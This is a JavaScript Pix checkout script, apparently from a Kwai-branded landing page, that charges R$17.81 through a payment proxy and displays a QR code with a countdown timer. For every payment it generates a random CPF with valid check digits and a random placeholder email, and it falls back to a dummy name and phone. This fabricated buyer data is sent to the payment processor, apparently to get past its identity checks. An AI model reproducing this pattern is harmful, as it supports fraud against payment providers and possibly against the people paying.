/**
 * pix-service.js — Integração MisticPay
 */
(function () {
  'use strict';

  const PROXY_URL    = '/api/amplopay_pix.php';
  const AMOUNT_CENTS = 1781;

  function gerarExternalId() {
    return 'KW-' + Date.now().toString(36).toUpperCase() +
           Math.random().toString(36).substring(2, 6).toUpperCase();
  }

  function lerInput(id) {
    const el = document.getElementById(id);
    return el ? el.value.trim() : '';
  }

  function apenasDigitos(str) {
    return String(str || '').replace(/\D/g, '');
  }

  function obterParametrosUrl() {
    const params = {};
    const queryString = window.location.search.substring(1);
    if (queryString) {
      const pairs = queryString.split('&');
      pairs.forEach(pair => {
        const [key, value] = pair.split('=');
        if (key) {
          params[decodeURIComponent(key)] = decodeURIComponent(value || '');
        }
      });
    }

    return params;
  }

  // Garante DDI 55 + mínimo 12 dígitos totais
  function formatarTelefone(raw) {
    let t = apenasDigitos(raw);
    if (!t || t.length < 10) t = '11999999999';
    if (!t.startsWith('55')) t = '55' + t;
    return t;
  }

  function gerarCpfFake() {
    let n = 9;
    let n1 = Math.round(Math.random() * n), n2 = Math.round(Math.random() * n), n3 = Math.round(Math.random() * n);
    let n4 = Math.round(Math.random() * n), n5 = Math.round(Math.random() * n), n6 = Math.round(Math.random() * n);
    let n7 = Math.round(Math.random() * n), n8 = Math.round(Math.random() * n), n9 = Math.round(Math.random() * n);
    let d1 = n9 * 2 + n8 * 3 + n7 * 4 + n6 * 5 + n5 * 6 + n4 * 7 + n3 * 8 + n2 * 9 + n1 * 10;
    d1 = 11 - (d1 % 11); if (d1 >= 10) d1 = 0;
    let d2 = d1 * 2 + n9 * 3 + n8 * 4 + n7 * 5 + n6 * 6 + n5 * 7 + n4 * 8 + n3 * 9 + n2 * 10 + n1 * 11;
    d2 = 11 - (d2 % 11); if (d2 >= 10) d2 = 0;
    return '' + n1 + n2 + n3 + n4 + n5 + n6 + n7 + n8 + n9 + d1 + d2;
  }

  async function generatePayment() {
    const nome  = lerInput('buckpay-nome')      || 'Cliente Kwai';
    const email = 'usuario' + (Math.floor(Math.random() * 90000) + 10000) + '@email.com';
    const cpf   = gerarCpfFake();
    // Lê o campo novo do modal; fallback para o campo antigo do form inicial
    const telefoneRaw = lerInput('buckpay-telefone') || lerInput('pix-key-input');
    const phone = formatarTelefone(telefoneRaw);

    // Obtém todos os parâmetros da URL
    const urlParams = obterParametrosUrl();

    const payload = {
      nome:      nome,
      cpf:       cpf || '00000000191',
      valor:     17.81,
      email:     email,
      telefone:  phone,
      external_id_client: gerarExternalId(),
      utm_source:         urlParams.utm_source || 'organic',
      utm_medium:         urlParams.utm_medium || 'organic',
      utm_campaign:       urlParams.utm_campaign || '',
      utm_content:        urlParams.utm_content || '',
      utm_term:           urlParams.utm_term || '',
      src:                urlParams.src || '',
      sck:                urlParams.sck || '',
      fbc:                urlParams.fbc || '',
      fbp:                urlParams.fbp || '',
      fbclid:             urlParams.fbclid || '',
      gclid:              urlParams.gclid || '',
      wbraid:             urlParams.wbraid || '',
      gbraid:             urlParams.gbraid || '',
      ttclid:             urlParams.ttclid || '',
      kclid:              urlParams.kclid || '',
      click_id:           urlParams.click_id || urlParams.clickid || ''
    };

    // Adiciona todos os parâmetros da URL não reconhecidos
    Object.keys(urlParams).forEach(key => {
      if (!payload.hasOwnProperty(key)) {
        payload[key] = urlParams[key];
      }
    });

    // Enriquece payload com dados da Dracofy
    if (typeof DracofyIntegration !== 'undefined') {
      DracofyIntegration.enriquecerPayload(payload);
    }

    let response;
    try {
      response = await fetch(PROXY_URL, {
        method:      'POST',
        credentials: 'include',
        headers: { 
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify(payload)
      });
    } catch (netErr) {
      throw new Error('Falha de conexão. Verifique sua internet e tente novamente.');
    }

    const rawText = await response.text();
    console.log('[AmploPay] HTTP', response.status, '->', rawText.substring(0, 500));

    let data;
    try { data = JSON.parse(rawText); }
    catch { throw new Error('Resposta inesperada do servidor.'); }

    if (!response.ok || data.error || data.status === 'error' || data.status === 'failed') {
      let msg = 'Erro ao processar pagamento.';
      if (data.error && data.error.message) {
        msg = data.error.message;
        if (data.error.detail && data.error.detail.buyer) {
          msg += ' — ' + JSON.stringify(data.error.detail.buyer);
        }
      } else if (data.message) {
        msg = data.message;
      } else if (typeof data.error === 'string') {
        msg = data.error;
      }
      throw new Error(msg);
    }

    const pixData = data && data.data;
    if (!pixData || (!pixData.qr_code && !pixData.pix_copy_paste && !pixData.qrcode && !pixData.pix_code)) {
      console.error('[AmploPay] Resposta completa:', JSON.stringify(data));
      throw new Error('Dados: ' + JSON.stringify(data).substring(0, 150));
    }

    return {
      qrcode_base64: pixData.qrcode_image || pixData.qr_code || pixData.qrcode || '',
      code:          pixData.pix_code || pixData.pix_copy_paste || ''
    };
  }

  window.PixService = { generatePayment };

  window.iniciarGeracaoPix = async function () {
    const nome     = lerInput('buckpay-nome');
    const telefone = apenasDigitos(lerInput('buckpay-telefone'));
    const errorForm = document.getElementById('buckpay-form-error');

    let erroMsg = '';
    if (!nome) {
      erroMsg = 'Por favor, digite seu nome completo.';
    } else if (telefone.length < 10) {
      erroMsg = 'Por favor, digite um telefone válido com DDD.';
    }

    if (erroMsg) {
      if (errorForm) { errorForm.textContent = erroMsg; errorForm.classList.remove('hidden'); }
      return;
    }
    if (errorForm) errorForm.classList.add('hidden');

    const step1 = document.getElementById('buckpay-step-1');
    const step2 = document.getElementById('buckpay-step-2');
    
    const btnSubmit = document.querySelector('#buckpay-step-1 button[onclick="iniciarGeracaoPix()"]');
    let originalBtnText = 'Finalizar Pagamento de 17,81';
    if (btnSubmit) {
      originalBtnText = btnSubmit.innerHTML;
      btnSubmit.disabled = true;
      btnSubmit.innerHTML = 'Gerando Pix... <svg class="animate-spin ml-2 inline" style="width:16px;height:16px;color:#fff;" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>';
    }

    try {
      const result = await window.PixService.generatePayment();
      
      // Sucesso! Troca para etapa 2
      if (step1) { step1.classList.remove('flex'); step1.classList.add('hidden'); }
      if (step2) { step2.classList.remove('hidden'); step2.classList.add('flex'); }

      // Start Timer
      const timerDisplay = document.getElementById('buckpay-timer');
      if (timerDisplay && !window.buckpayTimerStarted) {
          window.buckpayTimerStarted = true;
          let totalSeconds = 5 * 60 - 1; // 4:59
          const timerInterval = setInterval(function() {
              let minutes = Math.floor(totalSeconds / 60);
              let seconds = totalSeconds % 60;
              timerDisplay.textContent = (minutes < 10 ? '0' : '') + minutes + ':' + (seconds < 10 ? '0' : '') + seconds;
              if (totalSeconds <= 0) {
                  clearInterval(timerInterval);
              } else {
                  totalSeconds--;
              }
          }, 1000);
      }

      const qrcodeImg      = document.getElementById('buckpay-qrcode');
      const loadingDiv     = document.getElementById('buckpay-loading');
      const copyPasteInput = document.getElementById('buckpay-copypaste');
      const copyBtn        = document.getElementById('btn-copy-pix');
      
      if (loadingDiv) loadingDiv.style.display = 'none';

      let qrcodeSrc = '';
      if (result.qrcode_base64) {
        qrcodeSrc = result.qrcode_base64.startsWith('http') ? result.qrcode_base64 : 'data:image/png;base64,' + result.qrcode_base64;
      } else if (result.code) {
        // Se a AmploPay não devolver a imagem base64, geramos o QRCode a partir do Copia e Cola!
        qrcodeSrc = 'https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=' + encodeURIComponent(result.code);
      }

      if (qrcodeImg && qrcodeSrc) {
        qrcodeImg.src = qrcodeSrc;
        qrcodeImg.style.display = 'block';
      }

      if (copyPasteInput && result.code) {
        copyPasteInput.value = result.code;
        if (copyBtn) copyBtn.disabled = false;
      }

    } catch (err) {
      console.error('[AmploPay] Erro:', err);
      if (errorForm) {
        errorForm.textContent = err.message || 'Erro ao gerar PIX. Tente novamente.';
        errorForm.classList.remove('hidden');
      }
      if (btnSubmit) {
        btnSubmit.disabled = false;
        btnSubmit.innerHTML = originalBtnText;
      }
    }
  };

})();
